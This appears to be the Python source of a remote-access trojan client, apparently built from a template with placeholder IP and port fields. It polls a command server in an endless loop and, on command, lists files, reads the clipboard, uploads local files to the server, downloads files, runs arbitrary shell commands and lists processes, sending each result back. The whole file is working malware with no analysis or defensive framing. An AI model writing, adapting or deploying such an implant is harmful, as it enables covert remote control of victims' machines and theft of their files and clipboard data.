import requests
import time
import uuid
import os
import subprocess
import pyperclip

ip = "{{ip}}"
port = "{{port}}"
server_url = "http://"+ip+":"+port+"/client"
server_url = "http://127.0.0.1:8080/client"
client_uuid = str(uuid.uuid4())

print(client_uuid)
try:
    response = requests.post(server_url, headers={"UUID": client_uuid})
    print("Register Response:", response.text)
except requests.RequestException as e:
    print("Failed to register with server:", e)

def list_files():
    try:
        files = os.listdir('.')
        result = "\n".join(files)
        return result
    except Exception as e:
        return "Error listing files: " + str(e)

def get_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        return clipboard_content
    except Exception as e:
        return "Error getting clipboard content: " + str(e)
    
def download_file(file_path, server_url,save_path):
    url = f"{server_url}/download?filename={file_path}"
    try:
        print(url)
        response = requests.get(url, stream=True,headers={"UUID": client_uuid})
        if response.status_code == 200:
            with open(save_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            result = f"File downloaded successfully: {save_path}"
        else:
            result = f"Failed to download file. Status: {response.status_code}, Response: {response.text}"
    except Exception as e:
        result = f"Error downloading file: {e}"
    return result
    
def upload_file(file_path, server_url):
    if not os.path.exists(file_path):
        print(f"Error: The file '{file_path}' does not exist.")
        return
    
    url = f"{server_url}/upload"
    try:
        with open(file_path, 'rb') as file:
            files = {'file': file}
            print(url)
            response = requests.post(url, files=files,headers={"UUID": client_uuid})
            
            if response.status_code == 200:
                result = "File uploaded successfully."
            else:
                result = f"Failed to upload file. Status: {response.status_code}, Response: {response.text}"
    except Exception as e:
        result = f"Error uploading file: {e}"
    return result

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, text=True)
        return output
    except subprocess.CalledProcessError as e:
        return f"Error executing command: " + str(e)

def list_processes():
    try:
        output = subprocess.check_output("ps -aux", shell=True, text=True)
        return output
    except Exception as e:
        return "Error listing processes: " + str(e)

def handle_command(command):
    try:
        if command == "list_files":
            result = list_files()
        elif command == "get_clipboard":
            result = get_clipboard()
        elif command.startswith("download_file "):
            upload_path = command.split(" ", 1)[1]
            save_path = os.path.basename(upload_path)
            result = download_file(upload_path, server_url, save_path)
        elif command.startswith("upload_file "):
            result = upload_file(command.split(" ", 1)[1], server_url)
        elif command.startswith("execute_command "):
            result = execute_command(command.split(" ", 1)[1])
        elif command == "list_processes":
            result = list_processes()
        else:
            result = "Unknown command"
    except Exception as e:
        return {"status": "error", "message": str(e)}
    return result

while True:
    try:
        response = requests.get(server_url, headers={"UUID": client_uuid}, timeout=30)
        server_data = response.json()
        print("Server Response:", server_data)

        if "command" in server_data:
            command = server_data["command"]
            result = handle_command(command)
            print("Command Result:", result)
            requests.post(server_url, headers={"UUID": client_uuid}, json={"command": command,"result": result})
    except requests.ConnectionError as e:
        print("Connection error, retrying in 30 seconds:", e)
        time.sleep(30)
    except requests.RequestException as e:
        print("Request error:", e)
    except Exception as e:
        print("Unexpected error:", e)
    time.sleep(5)

